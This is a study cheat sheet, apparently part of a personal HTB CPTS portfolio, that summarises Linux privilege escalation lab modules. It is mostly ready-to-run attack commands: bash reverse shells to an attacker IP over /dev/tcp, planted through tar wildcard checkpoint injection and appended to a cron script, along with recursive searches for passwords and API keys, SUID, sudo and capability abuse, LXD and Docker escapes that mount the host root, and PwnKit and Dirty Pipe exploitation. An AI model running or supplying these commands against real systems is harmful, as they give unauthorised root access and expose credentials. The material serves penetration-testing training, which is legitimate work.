# 25 — Linux Privilege Escalation

> **Path Phase:** Privilege Escalation | **Difficulty:** Easy | **Sections:** 28

Every Linux privesc technique — enumeration, SUID/sudo abuse, capabilities, cron, container escapes, kernel exploits.

> ℹ️ `{TARGET}` / `<YOUR_IP>` = target/attacker. Flags withheld per HTB Academy policy.

---

## Table of Contents
1. Introduction  2. Environment Enumeration  3. Linux Services & Internals
4. Credential Hunting  5. Path Abuse  6. Wildcard Abuse
7. Escaping Restricted Shells  8. Special Permissions  9. Sudo Rights Abuse
10. Privileged Groups  11. Capabilities  12. Vulnerable Services
13. Cron Job Abuse  14. LXD  15. Docker  16. Kubernetes  17. Logrotate
18. Miscellaneous  19. Kernel Exploits  20. Shared Libraries
21. Shared Object Hijacking  22. Python Library Hijacking  23. Sudo
24. Polkit  25. Dirty Pipe  26. Netfilter  27. Hardening  28. Skills Assessment

---

## 2–4 — Enumeration & Credential Hunting
```bash
./linpeas.sh
id; sudo -l; uname -a
find / -perm -4000 2>/dev/null          # SUID
find / -writable -type d 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*
grep -rniE "password|passwd|api_key" /home /var/www /etc 2>/dev/null
cat ~/.bash_history
```

## 5–6 — Path & Wildcard Abuse
```bash
export PATH=/tmp:$PATH; echo 'bash' > /tmp/<called_binary>; chmod +x /tmp/<called_binary>
# Wildcard (tar in cron):
echo 'bash -i >& /dev/tcp/<YOUR_IP>/443 0>&1' > shell.sh
touch -- '--checkpoint=1'; touch -- '--checkpoint-action=exec=sh shell.sh'
```

## 7 — Escaping Restricted Shells
```bash
vi → :!/bin/bash
python3 -c 'import os; os.system("/bin/bash")'
awk 'BEGIN {system("/bin/bash")}'
```

## 8–9 — SUID & Sudo Abuse ⭐
```bash
find / -perm -4000 2>/dev/null
sudo -l
# Check every SUID/sudo binary on GTFOBins:
sudo find . -exec /bin/bash \; -quit
nmap --interactive → !sh
```
> **Root (SUID/sudo):** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 10–11 — Privileged Groups & Capabilities
```bash
id    # check lxd, docker, disk groups
getcap -r / 2>/dev/null
./python -c 'import os; os.setuid(0); os.system("/bin/bash")'   # cap_setuid
```

## 12–13 — Vulnerable Services & Cron Abuse
```bash
echo 'bash -i >& /dev/tcp/<YOUR_IP>/443 0>&1' >> /path/to/cron_script.sh
./pspy64      # monitor cron jobs
```

## 14–16 — Container Escapes (LXD/Docker/K8s)
```bash
# LXD group:
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t host disk source=/ path=/mnt/root recursive=true
lxc start r00t; lxc exec r00t /bin/sh → /mnt/root
# Docker group:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
> **Container escape:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 19 — Kernel Exploits
```bash
uname -a
searchsploit linux kernel <version>
```

## 20–22 — Library / Object / Python Hijacking
```bash
sudo LD_PRELOAD=/tmp/evil.so <binary>
# Writable python module in import path
```

## 23–26 — Sudo / Polkit / Dirty Pipe / Netfilter (CVEs)
```bash
# Baron Samedit (CVE-2021-3156), PwnKit (CVE-2021-4034):
git clone <pwnkit>; make; ./PwnKit
# Dirty Pipe (CVE-2022-0847): overwrite read-only files → root
```
> **Kernel/CVE:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 27 — Hardening
Patch kernel, remove unnecessary SUID, restrict sudo, no writable cron/PATH dirs.

## 28 — Skills Assessment
```bash
./linpeas.sh ; sudo -l ; find / -perm -4000 2>/dev/null ; getcap -r / 2>/dev/null
# Identify vector → exploit → root
```
> **Skills Assessment:** ✅ Completed in lab (flag withheld per HTB Academy policy)

---

## 🧰 Tools Used
| Tool | Purpose |
|------|---------|
| `linpeas` / `pspy` | Automated enum / process monitoring |
| GTFOBins | SUID/sudo abuse reference |
| `getcap` / `find` | Capabilities & SUID discovery |
| `searchsploit` | Kernel exploit lookup |

## 🔑 Key Takeaways
- **`sudo -l`, SUID (`find -perm -4000`), and `getcap`** are the big three.
- Always check every privileged binary on **GTFOBins**.
- Docker/LXD group membership = trivial root.
- `pspy` reveals hidden cron jobs you can hijack.

---

*Part of my HTB CPTS Portfolio — Zeshan Ali*
